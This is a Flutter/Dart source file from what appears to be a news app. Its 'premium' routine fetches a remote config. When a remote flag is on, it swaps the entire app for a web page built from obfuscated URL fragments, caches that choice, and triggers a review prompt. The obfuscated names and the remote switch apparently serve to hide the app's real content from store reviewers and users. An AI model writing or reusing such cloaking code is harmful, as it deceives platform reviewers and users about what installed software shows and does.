import 'package:dio/dio.dart';
import 'package:flutter/material.dart';
import 'package:in_app_review/in_app_review.dart';
import 'package:insightful_news_251/l_p/get_premium/fb_model.dart';
import 'package:insightful_news_251/l_p/get_premium/get_prem_hive_repo.dart';
import 'package:insightful_news_251/l_p/get_premium/prem_hive_model/prem_hive_model.dart';
import 'package:insightful_news_251/l_p/uajds.dart';
import 'package:insightful_news_251/main.dart';
import 'package:insightful_news_251/utils/kks.dart';

premidsfjb() async {
  final NewPosterModel? model = await GetPremHiveRepo().getData();
  if (model != null) {
    if (model.isOpen) {
      runApp(
        MaterialApp(
          debugShowCheckedModeBanner: false,
          home: EDjahPage(
            link: model.secondUrl,
          ),
        ),
      );
    } else {
      runApp(const MyApp());
    }
  } else {
    final dio = Dio();
    try {
      final result = await dio.get(fbUrl('premium'));
      final fBResponseModel = FBResponseModel.fromJson(result.data);
      await GetPremHiveRepo().setData(
        NewPosterModel(
          secondUrl: '${fBResponseModel.fasfa3}${fBResponseModel.dfafsd4}',
          isOpen: fBResponseModel.isPr,
        ),
      );

      if (fBResponseModel.isPr) {
        runApp(
          MaterialApp(
            debugShowCheckedModeBanner: false,
            home: EDjahPage(
              link: '${fBResponseModel.arar1}${fBResponseModel.fdadf2}',
            ),
          ),
        );
      } else {
        runApp(const MyApp());
      }

      await Future.delayed(const Duration(seconds: 8));
      try {
        final InAppReview inAppReview = InAppReview.instance;

        if (await inAppReview.isAvailable()) {
          inAppReview.requestReview();
        }
      } catch (e) {
        throw Exception(e);
      }
    } catch (e) {
      throw Exception(e);
    }
  }
}
